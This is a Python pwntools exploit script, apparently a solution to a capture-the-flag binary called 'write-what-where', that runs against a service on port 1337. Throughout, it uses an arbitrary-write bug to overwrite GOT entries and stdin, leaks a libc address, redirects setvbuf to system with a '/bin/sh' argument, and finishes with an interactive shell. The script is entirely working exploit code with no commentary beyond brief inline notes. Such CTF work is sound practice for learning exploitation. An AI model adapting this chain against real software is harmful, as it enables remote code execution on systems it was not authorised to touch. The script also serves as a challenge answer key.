from pwn import *

libc = ELF('../challenge/libc.so.6')
exe = ELF('../challenge/write-what-where')
conn = remote('0.0.0.0', 1337)

def www(what, where):
    conn.sendafter('what?\n', what)
    conn.sendlineafter('where?\n', where)

# overwrite exit with main+33 to get infinite writes
# while avoiding the call to init()
www(p32(exe.symbols['main']+33), str(exe.got['exit']))

# replace stdin with puts got
www(p32(exe.got['puts']), str(exe.symbols['stdin']))
www(p32(0), str(exe.symbols['stdin']+4))

# overwrite setvbuf with puts to get libc leak
www(p32(exe.plt['puts']), str(exe.got['setvbuf']))
www(p32(0), str(exe.got['setvbuf'] + 4))

# overwrite exit with main to trigger the call to init()
www(p32(exe.symbols['main']), str(exe.got['exit']))

# parse leak
libc_leak = u64(conn.recvline()[:-1].ljust(8, b'\x00'))
libc_base = libc_leak - 0x809d0
log.success('libc base: ' + hex(libc_base))

bin_sh = libc_base + 0x1abf05
system = libc_base + libc.symbols['system']

# overwrite exit with main+33 again to avoid init()
www(p32(exe.symbols['main']+33), str(exe.got['exit']))

# replace stdin with pointer to /bin/sh string
www(p64(bin_sh)[:4], str(exe.symbols['stdin']))
www(p64(bin_sh)[4:], str(exe.symbols['stdin']+4))

# overwrite setvbuf with system for the win
www(p64(system)[:4], str(exe.got['setvbuf']))
www(p64(system)[4:], str(exe.got['setvbuf']+4))

# overwrite exit with main to trigger the call to init()
www(p32(exe.symbols['main']), str(exe.got['exit']))

conn.interactive()
